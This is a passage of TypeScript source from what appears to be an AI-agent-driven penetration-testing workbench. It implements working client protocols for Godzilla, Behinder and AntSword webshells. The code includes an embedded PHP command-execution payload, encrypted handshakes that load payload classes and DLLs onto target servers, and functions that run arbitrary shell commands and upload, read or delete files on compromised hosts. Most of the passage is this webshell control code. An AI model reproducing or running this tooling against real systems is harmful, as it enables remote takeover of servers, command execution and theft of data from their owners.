    const path = rawPath.split('?')[0] || '/'
    return { host, path }
  }

  /** 哥斯拉 PhpDynamicPayload 服务端代码（从 assets/payloads/php/payload.php 内嵌，握手时发送） */
  private godzillaPhpPayload(): Buffer {
    const candidates = [
      join(process.cwd(), 'assets', 'payloads', 'php', 'payload.php'),
      join(__dirname, '..', 'assets', 'payloads', 'php', 'payload.php'),
    ]
    const found = candidates.find((p) => existsSync(p))
    if (found) return readFileSync(found)
    // 兜底：内置精简版（仅 execCommand，不依赖 session）
    return Buffer.from(`<?php
function run($pms){global $parameters;$parameters=array();formatParameter($pms);echo execCommand();}
function formatParameter($pms){global $parameters;$index=0;$key=null;while(true){$q=$pms[$index];if(ord($q)==2){$len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);$index+=4;$value=substr($pms,$index+1,$len);$index+=$len;$parameters[$key]=$value;$key=null;}else{$key.=$q;}$index++;if($index>strlen($pms)-1)break;}}
function bytesToInteger($bytes,$position){$val=0;$val=$bytes[$position+3]&255;$val<<=8;$val|=$bytes[$position+2]&255;$val<<=8;$val|=$bytes[$position+1]&255;$val<<=8;$val|=$bytes[$position]&255;return $val;}
function getBytes($string){$bytes=array();for($i=0;$i<strlen($string);$i++)array_push($bytes,ord($string[$i]));return $bytes;}
function get($key){global $parameters;return isset($parameters[$key])?$parameters[$key]:null;}
function execCommand(){@ob_start();$cmdLine=get("cmdLine");echo shell_exec($cmdLine." 2>&1");return ob_get_clean();}
function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:root ProcessArch:amd64 canCallGzipDecode:0 canCallGzipEncode:0 systempdir:/tmp";}
`, 'utf8')
  }

  /** 经内置代理发送 WebShell HTTP 请求（复用代理链，流量进流量面板）→ {code, body} */
  private wsRequest(w: { url: string; type: string; headers?: string; readTimeout?: number }, method: string, url: string, body?: string | Buffer, ct?: string): Promise<{ code: number; body: Buffer }> {
    return new Promise((resolve, reject) => {
      let u: URL
      try { u = new URL(url) } catch (e) { return reject(new Error(`URL 无效: ${url}`)) }
      // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
      const headers: Record<string, string> = { host: u.host }
      // 自定义请求头（哥斯拉 headers 字段，\r\n 分隔）
      if (w.headers) {
        for (const line of w.headers.split(/\r?\n/)) {
          const idx = line.indexOf(':')
          if (idx > 0) { const k = line.slice(0, idx).trim(); const v = line.slice(idx + 1).trim(); if (k.toLowerCase() !== 'host' && k.toLowerCase() !== 'content-length') headers[k] = v }
        }
      }
      if (ct) headers['content-type'] = ct
      // 显式 Content-Length：原版 JSP shell 用 request.getHeader("Content-Length") 读取 body
      if (body !== undefined && body !== null) {
        headers['content-length'] = String(Buffer.isBuffer(body) ? body.length : Buffer.byteLength(String(body)))
      }
      // 会话 cookie：按 URL 保持（哥斯拉/冰蝎握手+执行需同一 PHPSESSID）
      const cookie = this.wsCookies.get(u.href)
      if (cookie) headers['cookie'] = cookie
      const bufBody = body === undefined || body === null ? undefined : (Buffer.isBuffer(body) ? body : Buffer.from(body))
      this.engine.forwardInternal(u, method, headers, bufBody)
        .then((r) => {
          // 保存 Set-Cookie（保持 session）
          const sc = r.headers['set-cookie']
          if (sc) {
            const first = (Array.isArray(sc) ? sc[0] : sc).split(';')[0]
            if (first) this.wsCookies.set(u.href, first)
          }
          resolve({ code: r.code, body: r.body })
        })
        .catch(reject)
    })
  }

  /**
   * WebShell 命令执行（完整协议）：
   * - custom：GET ?cmd= 参数模式（基础一句话）
   * - antsword：POST shell=<base64 PHP 代码> 执行任意 PHP
   * - godzilla：XOR+base64（PHP）或 AES-ECB（JSP）加密协议 + session 会话
   * - behinder：AES-128-CBC（默认）或 XOR 协议 + func|params 格式
   */
  private async wsExecShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }, command: string): Promise<string> {
    const u = new URL(w.url)
    const key = w.key || '3c6e0b8a9c15224a'

    // ---- 蚁剑：PHP POST shell=base64(PHP)；JSP POST ?shell=base64(payload class)；ASPX JScript eval(shell) ----
    if (w.type === 'antsword') {
      if (w.script === 'jsp' || w.script === 'jspx') {
        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
        if (!existsSync(classPath)) throw new Error('蚁剑 JSP payload 缺失: HermesCmd.class')
        const classB64 = readFileSync(classPath).toString('base64')
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.wsRequest(w, 'POST', w.url + sep + 'shell=' + encodeURIComponent(classB64) + '&cmd=' + encodeURIComponent(command), '', 'application/x-www-form-urlencoded')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      if (w.script === 'aspx' || w.script === 'asp') {
        // 蚁剑 ASPX JScript：POST shell=<JScript 代码>，eval(shell, unsafe) 执行任意 JScript
        const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
        const jsCode = `var cmd=System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("${cmdB64}"));try{var psi=new System.Diagnostics.ProcessStartInfo("/bin/sh","-c "+cmd);psi.UseShellExecute=false;psi.RedirectStandardOutput=true;psi.RedirectStandardError=true;var p=System.Diagnostics.Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());}catch(e){Response.Write("ERR:"+e.message);}`
        const r = await this.wsRequest(w, 'POST', w.url, `shell=${encodeURIComponent(jsCode)}`, 'application/x-www-form-urlencoded')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      const phpCode = `echo shell_exec(${JSON.stringify(command)} . ' 2>&1');`
      const enc = antSwordPhpEncode(phpCode)
      const sep = w.url.includes('?') ? '&' : '?'
      const r = await this.wsRequest(w, 'POST', w.url + sep + 'id=1', `shell=${encodeURIComponent(enc)}`, 'application/x-www-form-urlencoded')
      return r.body.toString(w.encoding || 'utf8').trim()
    }

    // ---- custom：GET ?pwd=<密码>&cmd= 参数模式（生成的 shell 带 pwd 认证） ----
    if (w.type === 'custom') {
      u.searchParams.set('pwd', w.password || 'pass')
      u.searchParams.set('cmd', command)
      const r = await this.wsRequest(w, 'GET', u.href)
      return r.body.toString(w.encoding || 'utf8').trim()
    }

    // ---- 哥斯拉：XOR（PHP）/ AES-ECB（JSP/ASPX） ----
    if (w.type === 'godzilla') {
      const pass = w.password || 'pass'
      if (w.script === 'php') {
        // 原版 phpXor 协议：body = XOR(payload) 原始字节（shell 用 php://input 读取后 XOR），响应 = XOR(run 输出)（gzip）
        // 与原版一致：连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 $key 也是 md5 前16），密码不嵌入 shell
        const connKey = crypto.createHash('md5').update(w.key || '3c6e0b8a9c15224a', 'utf8').digest('hex').slice(0, 16)
        // 1) 握手 POST payload.php 建立 session
        const payload = this.godzillaPhpPayload()
        const encHand = godzillaPhpEncodeRaw(payload, connKey)
        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
        // 2) 执行命令：序列化参数（methodName=execCommand + cmdLine）
        const params = godzillaSerializeParams({ methodName: 'execCommand', cmdLine: command })
        const enc2 = godzillaPhpEncodeRaw(params, connKey)
        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
        let raw = xorCrypt(r2.body, connKey)
        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
          try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
        }
        return raw.toString(w.encoding || 'utf8').trim()
      }
      // 哥斯拉 JSP：AES-ECB。cryption 含 raw → 原版协议（body=原始字节，Content-Length 读取）；否则 base64 协议（pass=base64(AES)，响应 md5+base64）
      // 连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 xc 也是 md5 前16）
      const connKey2 = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
      const pmsJsp: Record<string, string> = { methodName: 'execCommand' }
      if (isRawJsp) {
        // RAW：body 原始字节
        const args = command.split(/\s+/).filter((s) => s.length > 0)
        pmsJsp.argsCount = String(args.length)
        args.forEach((a, i) => (pmsJsp[`arg-${i}`] = a))
        if (existsSync(classPath)) {
          const encHand = godzillaJspEncodeRaw(readFileSync(classPath), connKey2)
          await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
        }
        const enc2 = godzillaJspEncodeRaw(godzillaSerializeGzip(pmsJsp), connKey2)
        const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
        const dec2 = godzillaJspDecodeRaw(r2.body, connKey2)
        return dec2.toString(w.encoding || 'utf8').trim()
      }
      // BASE64：pass=base64(AES(...))，响应 md5(pass+xc)前16 + base64(AES(输出)) + md5后16
      const argsB = command.split(/\s+/).filter((s) => s.length > 0)
      const pmsB: Record<string, string> = { methodName: 'execCommand', argsCount: String(argsB.length) }
      argsB.forEach((a, i) => (pmsB[`arg-${i}`] = a))
      if (existsSync(classPath)) {
        const encHand = godzillaJspEncode(readFileSync(classPath), connKey2)
        await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(encHand)}`, 'application/x-www-form-urlencoded')
      }
      const enc2b = godzillaJspEncode(godzillaSerializeGzip(pmsB), connKey2)
      const r2b = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(enc2b)}`, 'application/x-www-form-urlencoded')
      const dec2b = godzillaJspDecode(r2b.body.toString('utf8'), connKey2, pass)
      return dec2b.toString(w.encoding || 'utf8').trim()
    }
    // 哥斯拉 ASPX：RijndaelManaged CBC 原版协议（BinaryRead 原始字节），连接密钥 = md5(用户 key) 前16
    if (w.type === 'godzilla' && (w.script === 'aspx' || w.script === 'asp')) {
      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
      if (existsSync(dllPath)) {
        const dll = readFileSync(dllPath)
        const encHand = godzillaCshapEncodeRaw(dll, connKey)
        await this.wsRequest(w, 'POST', w.url, encHand, 'application/octet-stream')
      }
      const tok = command.split(/\s+/).filter((s) => s.length > 0)
      const exe = tok[0] || 'id'
      const exeArgs = tok.slice(1).join(' ')
      const pms: Record<string, string> = { methodName: 'execCommand', executableFile: exe, executableArgs: exeArgs }
      // 参数体 = gzip(serialize)（C# formatParameter 用 GZipStream 解压），RijndaelManaged CBC(key,IV=key) 原始字节
      const enc2 = godzillaCshapEncodeRaw(godzillaSerializeGzip(pms), connKey)
      const r2 = await this.wsRequest(w, 'POST', w.url, enc2, 'application/octet-stream')
      const dec2 = godzillaCshapDecodeRaw(r2.body, connKey)
      return dec2.toString(w.encoding || 'utf8').trim()
    }

    // ---- 冰蝎：AES-128-CBC（默认）/ XOR ----
    if (w.type === 'behinder') {
      const pass = w.password || 'rebeyond'
      const cryption = w.cryption || 'aes'
      // JSP：下发自包含 payload class（HermesCmd.class，反射从 ?cmd= 读命令），服务端 defineClass→newInstance→equals(pageContext)
      if (w.script === 'jsp' || w.script === 'jspx') {
        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
        if (!existsSync(classPath)) throw new Error('冰蝎 JSP payload 缺失: HermesCmd.class')
        const classBytes = readFileSync(classPath)
        const enc = behinderAesEncode(classBytes, pass)
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), enc, 'application/octet-stream')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      // ASPX：下发 U.dll（RijndaelManaged CBC key/IV=md5密码前16），服务端 Assembly.Load→CreateInstance("U")→Equals(page)
      if (w.script === 'aspx') {
        const dllPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'csharp', 'U.dll')
        if (!existsSync(dllPath)) throw new Error('冰蝎 ASPX payload 缺失: U.dll')
        const dll = readFileSync(dllPath)
        const md5h = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
        const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(md5h, 'utf8'), Buffer.from(md5h, 'utf8'))
        // ASPX 模板 Request.BinaryRead(ContentLength) 直接解密 body 字节（无 base64）
        const raw = Buffer.concat([cipher.update(dll), cipher.final()])
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.wsRequest(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), raw, 'application/octet-stream')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      // 冰蝎 v2 模板协议：body = base64(AES-ECB(md5(pass)前16, "func|eval代码"))，服务端直接 eval(params)
      const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
      const evalCode = `$c=base64_decode("${cmdB64}");$o="";if(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$r);$o=implode("\\n",$r);}elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo $o;`
      const params = Buffer.from('var_dump|' + evalCode, 'utf8')
      let enc: string
      if (cryption.includes('xor')) enc = behinderXorEncode(params, pass)
      else enc = behinderAesEncode(params, pass)
      const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
      let dec: Buffer
      if (cryption.includes('xor')) dec = behinderXorDecode(r.body.toString('utf8'), pass)
      else dec = behinderAesDecode(r.body.toString('utf8'), pass)
      // 模板直接 echo eval 结果（明文），若非明文则用解密结果
      const out = r.body.toString(w.encoding || 'utf8').trim()
      return out.length > 0 ? out : dec.toString(w.encoding || 'utf8').trim()
    }

    throw new Error(`未知 webshell 类型: ${w.type}`)
  }

  /** 存活校验：哥斯拉走原版 test 协议（握手 + methodName=test → payload.test() 返回 ok）；其他类型执行标识命令 */
  private async wsAliveShell(w: { id: number; type: string; script: string; url: string; password: string; key: string; cryption?: string; payload?: string; encoding?: string; headers?: string; connTimeout?: number; readTimeout?: number }): Promise<{ alive: boolean; detail?: string; error?: string }> {
    try {
      if (w.type === 'godzilla') {
        const key = w.key || '3c6e0b8a9c15224a'
        const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
        const pass = w.password || 'pass'
        if (w.script === 'php') {
          // 握手建立 session → test()
          const payload = this.godzillaPhpPayload()
          await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
          const r = await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(godzillaSerializeParams({ methodName: 'test' }), connKey), 'application/octet-stream')
          let raw = xorCrypt(r.body, connKey)
          if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
          const s = raw.toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
        const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
        if (w.script === 'jsp' || w.script === 'jspx') {
          const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
          const hasClass = existsSync(classPath)
          if (isRawJsp) {
            if (hasClass) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
            const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
            const s = godzillaJspDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
            return { alive: s.includes('ok'), detail: s.slice(0, 200) }
          }
          if (hasClass) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
          const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(godzillaSerializeGzip({ methodName: 'test' }), connKey))}`, 'application/x-www-form-urlencoded')
          const s = godzillaJspDecode(r.body.toString('utf8'), connKey, pass).toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
        if (w.script === 'aspx' || w.script === 'asp') {
          const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
          if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
          const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
          const s = godzillaCshapDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
      }
      // 其他类型（冰蝎/蚁剑/自定义）：执行标识命令验证非空响应
      const out = await this.wsExecShell(w, 'echo pentbox_alive_check')
      return { alive: out.includes('pentbox_alive_check'), detail: out.slice(0, 200) }
    } catch (e) {
      return { alive: false, error: (e as Error).message }
    }
  }

  /** 文件操作（参考哥斯拉原版：调 payload 方法 getFile/readFileContent/uploadFile/deleteFile，而非 shell 命令，JSP/PHP/ASPX 均支持） */
  private async wsFileOp(w: { url: string; type: string; script: string; password: string; key: string; cryption?: string; encoding?: string; headers?: string; readTimeout?: number }, pms: Record<string, string>): Promise<Buffer> {
    const key = w.key || '3c6e0b8a9c15224a'
    const pass = w.password || 'pass'
    if (w.type === 'godzilla') {
      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      if (w.script === 'php') {
        const payload = this.godzillaPhpPayload()
        await this.wsRequest(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
        const enc = godzillaPhpEncodeRaw(godzillaSerializeParams(pms), connKey)
        const r = await this.wsRequest(w, 'POST', w.url, enc, 'application/octet-stream')
        let raw = xorCrypt(r.body, connKey)
        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
        return raw
      }
      const isRaw = (w.cryption || '').toLowerCase().includes('raw')
      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
      const gz = godzillaSerializeGzip(pms)
      if (w.script === 'jsp' || w.script === 'jspx') {
        if (isRaw) {
          if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
          const r = await this.wsRequest(w, 'POST', w.url, godzillaJspEncodeRaw(gz, connKey), 'application/octet-stream')
          return godzillaJspDecodeRaw(r.body, connKey)
        }
        if (existsSync(classPath)) await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
        const r = await this.wsRequest(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(gz, connKey))}`, 'application/x-www-form-urlencoded')
        return godzillaJspDecode(r.body.toString('utf8'), connKey, pass)
      }
      if (w.script === 'aspx' || w.script === 'asp') {
        const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
        if (existsSync(dllPath)) await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
        const r = await this.wsRequest(w, 'POST', w.url, godzillaCshapEncodeRaw(gz, connKey), 'application/octet-stream')
        return godzillaCshapDecodeRaw(r.body, connKey)
      }
    }
    throw new Error('该类型暂不支持文件操作')
  }

  /** WebSocket 单发（连接 → 发送 → 收一条 → 关闭，8s 超时） */
  private wsSendOnce(url: string, payload: string): Promise<string> {
    return new Promise((resolve, reject) => {
      const ws = new WebSocket(url, { handshakeTimeout: 5000 })
      const timer = setTimeout(() => { try { ws.terminate() } catch {}; reject(new Error('WS 超时（8s 无响应）')) }, 8000)
      ws.on('open', () => ws.send(payload))
      ws.on('message', (d) => { clearTimeout(timer); try { ws.close() } catch {}; resolve(String(d)) })
      ws.on('error', (e) => { clearTimeout(timer); reject(new Error(`WS 错误: ${(e as Error).message}`)) })
      ws.on('close', () => { clearTimeout(timer) })
    })
  }

  /** Repeater：解析请求文本 → 走内置代理发送（复用上游链）→ 响应文本 + 入流量库。协议自动识别：首行 ws:// 或 wss:// 走 WebSocket，其余 HTTP/HTTPS */
  private async repeaterSend(raw: string): Promise<{ statusLine: string; headers: string[]; body: string }> {
    const text = raw.replace(/\r\n/g, '\n')
    const [head, bodyPart] = text.split('\n\n', 2)
    const lines = head.split('\n')
    // WebSocket：首行即 URL（ws:// 或 wss://），payload 在 body
    if ((lines[0] ?? '').trim().startsWith('ws://') || (lines[0] ?? '').trim().startsWith('wss://')) {
      const msg = await this.wsSendOnce(lines[0].trim(), bodyPart ?? '')
      // 重发器流量不进 HTTP 流量表（仅 WebSockets 帧历史保留）
      this.pushWs({ ts: Date.now(), direction: 'sent', payload: bodyPart ?? '', length: (bodyPart ?? '').length })
      this.pushWs({ ts: Date.now(), direction: 'received', payload: msg, length: msg.length })
      return { statusLine: 'WebSocket', headers: [], body: msg }
    }
    const [method, path, version] = (lines[0] ?? '').trim().split(/\s+/)
    if (!method || !path) throw new Error('请求行格式错误（应为: METHOD PATH HTTP/1.1）')
    const headers: Record<string, string> = {}
    for (const l of lines.slice(1)) {
      const idx = l.indexOf(':')
      if (idx > 0) headers[l.slice(0, idx).trim()] = l.slice(idx + 1).trim()
    }
    const host = headers['host'] || headers['Host']
    if (!host) throw new Error('缺少 Host 头')
    const scheme = path.startsWith('http') ? new URL(path).protocol.replace(':', '') : (path.startsWith('/') ? 'http' : 'http')
    const url = new URL(path.startsWith('/') ? `${scheme}://${host}${path}` : path)
    const body = Buffer.from(bodyPart ?? '', 'utf8')
    // 发送头：剔除 hop-by-hop + 重算 content-length
    const skip = new Set(['host', 'connection', 'proxy-connection', 'keep-alive', 'transfer-encoding', 'content-length'])
    const outHeaders: Record<string, string> = {}
    for (const [k, v] of Object.entries(headers)) if (!skip.has(k.toLowerCase())) outHeaders[k] = v
    if (body.length) outHeaders['content-length'] = String(body.length)
    // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
    const r = await this.engine.forwardInternal(url, method, outHeaders, body)
    const outLines: string[] = []
    for (const [k, v] of Object.entries(r.headers)) {
      if (k.toLowerCase() === 'rawheaders') continue
      if (Array.isArray(v)) for (const item of v) outLines.push(`${k}: ${item}`)
      else outLines.push(`${k}: ${v}`)
    }
    const resp = {
      statusLine: `HTTP/1.1 ${r.code}`,
      headers: outLines,
      body: decodeBody(r.body, (r.headers['content-encoding'] as string) || undefined),
    }
    return resp
  }

  /** Repeater：解析请求文本 → 走内置代理发送（复用上游链）→ 响应文本 + 入流量库 */
  private json(res: ServerResponse, code: number, body: unknown): void {
    const data = JSON.stringify(body)
    res.writeHead(code, { 'content-type': 'application/json; charset=utf-8', 'content-length': Buffer.byteLength(data), ...CORS })
    res.end(data)
  }

  private readBody(req: IncomingMessage): Promise<string> {
    return new Promise((resolve, reject) => {
      let b = ''
      req.on('data', (c) => {
        b += c
        if (b.length > 1 << 20) { reject(new Error('body too large')); req.destroy() }
      })
      req.on('end', () => resolve(b))
      req.on('error', reject)
    })
  }

  private async handle(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`)
    if (req.method === 'OPTIONS') {
      res.writeHead(204, CORS)
      res.end()
      return
    }
    try {
      switch (url.pathname) {
        case '/api/graph/query': {
          // Agent 主动查图：默认返回图情报文本（与注入格式一致）；?format=json 返回结构化对象；?host= 只看该主机
          const fmt = url.searchParams.get('format') === 'json' ? 'json' : 'text'
          if (fmt === 'json') {
            const data = await this.graph.queryGraph(url.searchParams.get('host') || undefined)
            this.json(res, 200, { ok: true, hosts: data })
          } else {
            const txt = await this.graph.contextPrompt(url.searchParams.get('host') || undefined)
            this.json(res, 200, { ok: true, text: txt || '（Neo4j 图暂无数据）' })
          }
          break
        }
        case '/api/graph/note': {
          // Agent 主动记录情报到图（给其他 Agent 共享；非破坏性）
          const b = JSON.parse(await this.readBody(req)) as { host?: string; path?: string; text: string; level?: string; tag?: string }
          if (!b.text) throw new Error('text 缺失')
          const host = b.host || ''
          const path = b.path || ''
          this.graph.writeNote({ kind: 'note', text: String(b.text).slice(0, 400), host, path, persist: true, level: b.level || 'info', tag: b.tag || '' }).catch(() => {})
          this.broadcastGraphChange(`Agent 记录 [${b.tag || 'note'}](${b.level || 'info'}) ${host}${path}: ${String(b.text).slice(0, 60)}`)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/status': {
          const u = this.engine.getUpstream()
          // 局域网地址列表（供远程 Hermes 访问本工作台；虚拟网卡可能在前，需按网段匹配）
          const nets = os.networkInterfaces()
          const lanIps = Object.values(nets).flat().filter((n: any) => n && n.family === 'IPv4' && !n.internal).map((n: any) => n.address)
          this.json(res, 200, {
            proxy: { running: true, port: this.opts.proxyPort ?? this.port },
            upstream: u,
            browser: {
              chrome: !!this.deps.chrome?.isRunning(),
              firefox: !!this.deps.firefox?.isRunning(),
            },
            mitm: this.engine.mitmEnabled,
            ssh: !!this.deps.ssh?.isConnected(),
            flows: { total: this.flows.length },
            hermes: this.hermesOnline ? 'active' : 'offline',
            lan_ip: lanIps[0] ?? '',
            lan_ips: lanIps,
          })
          break
        }
        case '/api/flows': {
          const limit = Math.min(Number(url.searchParams.get('limit')) || 50, 1000)
          const after = Number(url.searchParams.get('after')) || 0
          const q = (url.searchParams.get('q') || '').toLowerCase()
          let items = this.flows.filter((f) => f.id > after)
          if (q) items = items.filter((f) => (f.method + ' ' + f.url).toLowerCase().includes(q))
          // builtin/skipped 标记：浏览器自带与错误码流量不送 Agent，Site Map 据此排除
          items = items.map((f) => ({ ...f, builtin: !!this.analyzeMap.get(f.id)?.builtin, skipped: !!this.analyzeMap.get(f.id)?.skipped }))
          items = items.slice(-limit)
          this.json(res, 200, { items, next: items.length ? items[items.length - 1].id : after })
          break
        }
        // ---------------- 清空历史（右键菜单；删除所选条目为前端假删除——仅 HTTP History 移除，站点地图保留） ----------------
        case '/api/flows/clear': {
          this.flows = []
          this.flowDetails.clear()
          this.analyzeMap.clear()
          this.json(res, 200, { ok: true })
          break
        }
        // Agent 聚合读取：HTTP/HTTPS 流量 + WebSocket 帧一次返回；full=1 时每条带完整请求/响应报文
        case '/api/traffic': {
          const limit = Math.min(Number(url.searchParams.get('limit')) || 20, 200)
          const full = url.searchParams.get('full') === '1'
          const fmt = (line: string, raw: string[], body: string) => `${line}\n${(raw || []).join('\n')}\n\n${body || ''}`
          const http = this.flows.slice(-limit).reverse().map((f) => {
            if (!full) return f
            const d = this.flowDetails.get(f.id)
            return d ? { ...f, detail: { request: fmt(d.reqLine ?? '', d.reqRawHeaders ?? [], d.reqBody ?? ''), response: fmt(d.resLine ?? '', d.resRawHeaders ?? [], d.resBody ?? '') } } : f
          })
          const ws = this.wsFlows.slice(-limit).reverse()
          this.json(res, 200, { total: this.flows.length, wsTotal: this.wsFlows.length, http, ws })
          break
        }
        case '/api/events': {
          res.writeHead(200, {
            'content-type': 'text/event-stream',
            'cache-control': 'no-cache',
            connection: 'keep-alive',
            ...CORS,
          })
          res.write(`data: ${JSON.stringify({ type: 'hello', ts: Date.now() })}\n\n`)
          this.sseClients.add(res)
          req.on('close', () => this.sseClients.delete(res))
          break
        }
        // ---------------- 浏览器控制 ----------------
        case '/api/chat': {
          const body = JSON.parse(await this.readBody(req)) as { message: string; stream?: boolean }
          if (!body.message) throw new Error('empty message')
          if (body.stream) {
            // SSE 流式对话（经本地 gateway，与渗透同通道）：message.delta → data:{"type":"delta"...}；收尾 data:{"type":"done"...}
            // 客户端断开（abort）→ 触发 gateway stop（不中断渗透/分析，独立会话）
            res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', connection: 'keep-alive', ...CORS })
            let closed = false
            const send = (obj: unknown) => { if (!closed) { try { res.write(`data: ${JSON.stringify(obj)}\n\n`) } catch { /* 客户端已断开 */ } } }
            const stop = (abort: () => void) => { req.on('close', () => { closed = true; try { abort() } catch { /* 已结束 */ } }) }
            try {
              // 主 Agent 聊天框：注入 Neo4j 图上下文（全局情报/漏洞/凭据/WebShell/渗透状态），与流量分析/渗透通道一致
              const gctx = await this.digestPrompt()
              const input = `${gctx ? gctx : ''}${this.toolsHint()}【用户消息】${body.message}`
              // chatViaGateway 的 onEvent 已推送 done/error，这里只需等它完成并结束响应
              await this.chatViaGateway(input, this.chatSessionId, (ev) => send(ev), stop)
              // 主 Agent 回流：用户消息中含目标 URL/明确指示 → 写入全局情报（子 Agent 共享，最高优先级）
              const msgUrl = (body.message || '').match(/https?:\/\/[^\s"'）)\]]+/)?.[0]
              const msgKey = (body.message || '').match(/(?:目标|target|渗透|测试)[:：]?\s*([a-zA-Z0-9.\-:]+)/)?.[1]
              const refUrl = msgUrl || msgKey
              if (refUrl) {
                const nHost = this.hostOf(msgUrl || refUrl.includes('://') ? msgUrl || refUrl : `http://${refUrl}`)
                const nPath = msgUrl ? msgUrl.replace(/^https?:\/\/[^/]+/i, '') : ''
                this.pushDigest({ kind: 'note', host: nHost, path: nPath, data: `主 Agent 指示：${body.message.slice(0, 80)}`, persist: true })
              }
            } catch (e) {
              if (!closed) send({ type: 'error', error: e instanceof Error ? e.message : String(e) })
            }
            res.end()
            break
          }
          const reply = await this.hermesChat(body.message, await this.digestPrompt(), this.toolsHint())
          this.json(res, 200, { reply, sessionId: this.analyzeSlots[0] })
          break
        }
        // ---------------- Agent Bridge 运行中引导（steer）/ 状态 / 中断 ----------------
        case '/api/chat/steer': {
